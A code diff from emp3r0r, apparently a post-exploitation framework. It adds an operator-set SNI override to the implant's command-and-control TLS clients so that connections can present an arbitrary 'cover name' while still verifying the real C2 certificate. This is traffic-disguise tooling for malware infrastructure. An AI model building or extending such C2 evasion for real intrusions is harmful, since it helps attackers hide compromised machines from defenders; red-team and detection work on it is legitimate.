@@ -6,12 +6,34 @@ import (
 	"net/http"
 	"net/url"
 	"strings"
+	"sync/atomic"
 	"time"
 
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	utls "github.com/refraction-networking/utls"
 )
+
+// c2ServerName stores the operator-configured SNI override for C2 TLS.
+var c2ServerName atomic.Value // string
+
+// SetC2ServerName sets the SNI presented on C2 TLS connections. An empty value
+// uses the C2 address host. The C2 TLS listener does not select a certificate
+// by SNI, so this can be an arbitrary cover name; the server certificate is
+// still verified against the real C2 host.
+func SetC2ServerName(name string) {
+	c2ServerName.Store(strings.TrimSpace(name))
+}
+
+// c2ServerNames returns the SNI to send and the name to verify the server
+// certificate against. Without an override both are the C2 host, which also
+// lets crypto/tls omit SNI for IP literals.
+func c2ServerNames(c2Host string) (sni, verifyName string) {
+	if custom, _ := c2ServerName.Load().(string); custom != "" {
+		return custom, c2Host
+	}
+	return c2Host, ""
+}
 
 var GlobalMeshDialer func(ctx context.Context, network, addr string) (net.Conn, error)
 
@@ -42,10 +64,12 @@ func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
 
 	// Trust the augmented cert pool in our TLS client
 	c2_host := c2url.Hostname()
+	sni, verifyName := c2ServerNames(c2_host)
 	config := &utls.Config{
-		ServerName:         c2_host,
-		InsecureSkipVerify: false,
-		RootCAs:            rootCAs,
+		ServerName:                 sni,
+		InsecureServerNameToVerify: verifyName,
+		InsecureSkipVerify:         false,
+		RootCAs:                    rootCAs,
 	}
 
 	// fingerprint of CA
@@ -121,10 +145,12 @@ func CreatePreflightHTTPClient(c2Addr string) *http.Client {
 
 	// Trust only C2's CA cert in our TLS client
 	c2Host := c2url.Hostname()
+	sni, verifyName := c2ServerNames(c2Host)
 	config := &utls.Config{
-		ServerName:         c2Host,
-		InsecureSkipVerify: false,
-		RootCAs:            rootCAs,
+		ServerName:                 sni,
+		InsecureServerNameToVerify: verifyName,
+		InsecureSkipVerify:         false,
+		RootCAs:                    rootCAs,
 	}
 
 	// Use NewUTLSRoundTripper with random ALPN fingerprint for preflight
